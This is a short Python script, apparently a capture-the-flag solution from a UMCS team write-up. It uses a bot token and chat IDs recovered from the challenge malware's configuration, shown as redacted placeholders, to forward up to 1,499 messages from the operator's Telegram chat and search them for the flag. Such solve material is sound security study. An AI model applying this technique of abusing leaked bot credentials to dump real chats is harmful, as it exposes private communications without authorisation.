#!/usr/bin/env python3
"""Sanitised recovery workflow from the UMCS team write-up.

The original CTF malware configuration contained a real Telegram token and chat IDs.
Those values are deliberately not redistributed. Insert only credentials you are
authorised to use in a controlled reproduction environment.
"""
import re
import time
import requests

TOKEN = "REDACTED_TELEGRAM_TOKEN"
SRC_CHAT_ID = "REDACTED_CHAT_ID"
MY_CHAT_ID = "REDACTED_CHAT_ID"
BASE = f"https://api.telegram.org/bot{TOKEN}"


def api(method, params=None):
    while True:
        response = requests.get(f"{BASE}/{method}", params=params or {}, timeout=20)
        data = response.json()
        if not data.get("ok") and data.get("error_code") == 429:
            time.sleep(data.get("parameters", {}).get("retry_after", 5))
            continue
        return data


for message_id in range(1, 1500):
    data = api("forwardMessage", {
        "chat_id": MY_CHAT_ID,
        "from_chat_id": SRC_CHAT_ID,
        "message_id": message_id,
        "disable_notification": True,
    })
    if not data.get("ok"):
        continue
    match = re.search(r"UMCS\{[^}]+\}", str(data))
    if match:
        print(match.group(0))
        break
